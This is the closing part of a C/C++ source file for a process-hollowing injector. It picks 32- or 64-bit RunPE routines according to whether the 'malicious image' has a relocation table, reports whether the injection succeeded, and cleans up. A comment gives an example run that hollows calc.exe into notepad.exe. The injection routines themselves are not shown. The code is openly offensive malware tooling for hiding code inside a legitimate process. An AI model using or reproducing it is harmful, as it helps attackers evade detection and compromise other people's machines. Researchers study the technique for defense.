	if (!bHasReloc)
		printf("[Success] The Malcious image doesn't have a relocation table.\n");
	else
		printf("[Success] The Malcious image has a relocation table.\n");


	if (bSource32 && !bHasReloc)
	{
		if (RunPE32(&PI, hMalFileContent))
		{
			printf("[Success] The injection has succeed !\n");
			CleanProcess(&PI, hMalFileContent);
			return 0;
		}
	}

	if (bSource32 && bHasReloc)
	{
		if (RunPEReloc32(&PI, hMalFileContent))
		{
			printf("[Success] The injection has succeed !\n");
			CleanProcess(&PI, hMalFileContent);
			return 0;
		}
	}

	if (!bSource32 && !bHasReloc)
	{
		if (RunPE64(&PI, hMalFileContent))
		{
			printf("[Success] The injection has succeed !\n");
			CleanProcess(&PI, hMalFileContent);
			return 0;
		}
	}

	if (!bSource32 && bHasReloc)
	{
		if (RunPEReloc64(&PI, hMalFileContent))
		{
			printf("[Success] The injection has succeed !\n");
			CleanProcess(&PI, hMalFileContent);
			return 0;
		}
	}

	printf("[Error] The injection has failed !\n");

	if (hMalFileContent != nullptr)
		HeapFree(GetProcessHeap(), 0, hMalFileContent);

	if (PI.hThread != nullptr)
		CloseHandle(PI.hThread);

	if (PI.hProcess != nullptr)
	{
		TerminateProcess(PI.hProcess, -1);
		CloseHandle(PI.hProcess);
	}

	return -1;
}

/*"Process Hollowing.exe" "C:\Windows\SysWOW64\calc.exe" "C:\Windows\SysWOW64\notepad.exe"*/
